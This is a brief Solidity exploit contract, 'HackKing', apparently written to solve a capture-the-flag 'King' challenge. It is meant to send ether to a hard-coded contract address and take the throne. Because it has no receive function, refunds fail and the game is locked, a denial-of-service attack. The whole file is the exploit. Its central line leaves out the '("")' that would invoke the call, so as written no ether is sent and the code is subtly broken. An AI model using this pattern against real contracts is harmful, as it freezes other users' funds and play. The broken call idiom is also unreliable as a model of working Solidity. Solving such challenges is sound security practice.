// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface King {}

contract HackKing {
    King public king = King(0x293596C669ef6b2aD3bAa28d0f70Ce9105115882);

    constructor() public payable {}

    function takeTheThrone() public {
        address(king).call{value: 0.2 ether};
    }

    //No receive function; cannot accept the transfer to leave the throne.
}